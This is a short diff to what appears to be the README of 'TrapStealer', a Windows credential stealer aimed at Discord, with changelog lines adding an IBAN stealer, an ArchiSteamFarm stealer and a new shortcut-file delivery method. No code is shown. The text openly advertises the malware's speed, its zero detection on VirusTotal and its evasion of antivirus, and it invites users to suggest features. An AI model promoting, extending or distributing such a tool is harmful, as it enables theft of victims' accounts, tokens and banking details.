@@ -3,7 +3,7 @@
 </p>
 
 <p align="center">
-  TrapStealer is a Windows stealer for Discord and much more. Steal Time: ~4-9 seconds. 0 Detection on VirusTotal (Injection too) (Exe 5/69) 83 STARS THANKS - Join discord to suggest features 
+  TrapStealer is a Windows stealer for Discord and much more. Steal Time: ~4-9 seconds. 0 Detection on VirusTotal (Injection too) 83 STARS THANKS - Join discord to suggest features 
 </p>
 
 <p align="center">
@@ -94,6 +94,7 @@
 
 ## <a id="Changelog"></a>📝・Changelog
 ```
+- V4.9.1 New LNK (Shortcut) 0 detection !
 - V4.9 A lot of stuff, trap extension (Iban Stealer) Bug fixed and more!
 - V4.8.8 Added Debugging System
 - V4.8.7 Added ArchiSteamFarm Stealer
